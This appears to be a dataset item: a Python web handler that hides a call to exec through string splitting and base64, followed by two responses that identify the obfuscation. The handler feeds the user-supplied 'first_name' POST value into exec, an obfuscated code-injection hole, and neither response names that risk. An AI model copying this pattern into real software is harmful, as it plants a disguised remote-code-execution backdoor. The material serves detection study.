Tested Code:

def unexpected_occurrence(anticipated_occurrence):
    import base64
    if anticipated_occurrence.method == "POST":
        initiation_nomenclature = anticipated_occurrence.POST.get("first_name", "")
        _re_code = "ex" + "ec"
        encoded_re_code = base64.b64encode(_re_code.encode('ascii')).decode('ascii')
        decoded_re_code = base64.b64decode(encoded_re_code).decode('ascii')
        getattr(__builtins__, decoded_re_code)("setname (%s)" % initiation_nomenclature)

Cycle_1_response:
Yes, there is obfuscation in the incomplete code snippet. This can be seen in the creation and usage of the `_re_code` variable. The string 'exec' is obfuscated by splitting it as 'ex' + 'ec' and then further encoded and decoded using base64 encoding, which is a method of obfuscation. In the end, the string 'exec' is being used to call a Python function dynamically which itself is an obfuscation technique.

Cycle_1_response:
Yes, there is obfuscation in the code snippet. 

The use of base64 encoding to store the string "exec" and subsequently decoding it to use the Python built-in exec function is an example of code obfuscation. The use of "anticipated_occurrence" instead of a more common name like "request" can also be considered a form of obfuscation.
